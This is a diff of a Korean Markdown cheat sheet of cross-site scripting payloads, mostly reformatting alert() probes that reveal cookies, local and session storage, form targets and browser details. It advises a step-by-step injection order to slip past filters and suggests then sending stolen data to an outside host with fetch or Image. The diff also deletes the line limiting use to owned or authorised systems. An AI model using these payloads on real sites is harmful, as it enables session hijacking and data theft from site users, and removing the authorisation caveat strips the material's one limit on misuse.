@@ -7,21 +7,21 @@
 ## 1. 지금 이 페이지/도메인 확인
 
 ```js
-alert(document.domain)
+alert(document.domain);
 ```
 
 ```js
-alert(location.href)
+alert(location.href);
 ```
 
 ```js
-alert(document.title)
+alert(document.title);
 ```
 
 ## 2. 쿠키 확인
 
 ```js
-alert(document.cookie)
+alert(document.cookie);
 ```
 
 쿠키에 session, token, auth, remember_me, phpsessid, JSESSIONID 같은 값이 있으면 위험하다.
@@ -31,9 +31,13 @@ alert(document.cookie)
 ```js
 try {
   document.cookie = "probe=1";
-  alert(document.cookie.indexOf("probe") !== -1 ? "cookie_write_ok" : "cookie_write_blocked")
-} catch(e) {
-  alert("cookie_write_error")
+  alert(
+    document.cookie.indexOf("probe") !== -1
+      ? "cookie_write_ok"
+      : "cookie_write_blocked",
+  );
+} catch (e) {
+  alert("cookie_write_error");
 }
 ```
 
@@ -42,89 +46,96 @@ try {
 ## 4. 페이지 내부 정보 수집
 
 ```js
-alert(navigator.userAgent)
+alert(navigator.userAgent);
 ```
 
 ```js
-alert(navigator.language)
+alert(navigator.language);
 ```
 
 ```js
-alert(screen.width + "," + screen.height)
+alert(screen.width + "," + screen.height);
 ```
 
 ```js
-alert(screen.colorDepth)
+alert(screen.colorDepth);
 ```
 
 ## 5. 저장된 정보 확인
 
 ```js
-alert(localStorage.length)
+alert(localStorage.length);
 ```
 
 ```js
 try {
-  alert(JSON.stringify(localStorage))
-} catch(e) {
-  alert("localStorage_error")
+  alert(JSON.stringify(localStorage));
+} catch (e) {
+  alert("localStorage_error");
 }
 ```
 
 ```js
 try {
-  alert(sessionStorage.length)
-} catch(e) {
-  alert("sessionStorage_error")
+  alert(sessionStorage.length);
+} catch (e) {
+  alert("sessionStorage_error");
 }
 ```
 
 ## 6. 폼/입력값/데이터 수집
 
 ```js
-alert(document.forms.length)
+alert(document.forms.length);
 ```
 
 ```js
-for(var i=0;i<document.forms.length;i++){
-  alert('FORM ' + i + ': ' + document.forms[i].action + ' | ' + document.forms[i].method)
+for (var i = 0; i < document.forms.length; i++) {
+  alert(
+    "FORM " +
+      i +
+      ": " +
+      document.forms[i].action +
+      " | " +
+      document.forms[i].method,
+  );
 }
 ```
 
 ```js
-alert(document.URL)
+alert(document.URL);
 ```
 
 ```js
-alert(document.referrer)
+alert(document.referrer);
 ```
 
 ## 9. 인증 우회 확인
 
 ```js
-alert(navigator.onLine)
+alert(navigator.onLine);
 ```
 
 ```js
-alert(navigator.plugins.length)
+alert(navigator.plugins.length);
 ```
 
 ```js
-alert(navigator.mimeTypes.length)
+alert(navigator.mimeTypes.length);
 ```
 
 ## 10. 정상 동작 확인용
 
 ```js
-alert('test')
+alert("test");
 ```
 
 ```js
-alert(1)
+alert(1);
 ```
 
 ```js
-alert(true)
+alert(true);
 ```
 
 ## 실전 추천 순서
@@ -132,14 +143,13 @@ alert(true)
 처음부터 너무 많이 넣으면 필터에 걸리거나 브라우저가 이상해질 수 있다. 보통 이 순서가 좋다.
 
 ```js
-alert('1')                          // 실행 확인
-alert(document.domain)              // 어떤 페이지인지 확인
-alert(document.cookie)              // 쿠키 확인
-alert(navigator.userAgent)          // 사용자 환경 확인
-alert(document.forms.length)        // 폼 개수 확인
-alert(document.URL)                 // 현재 URL 확인
+alert("1"); // 실행 확인
+alert(document.domain); // 어떤 페이지인지 확인
+alert(document.cookie); // 쿠키 확인
+alert(navigator.userAgent); // 사용자 환경 확인
+alert(document.forms.length); // 폼 개수 확인
+alert(document.URL); // 현재 URL 확인
 ```
 
 이렇게 3단계까지 끝나면, 그다음부터는 `document.cookie` 말고 `fetch`/`Image`로 외부로 보내는 흐름이 좋다.
 
-- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
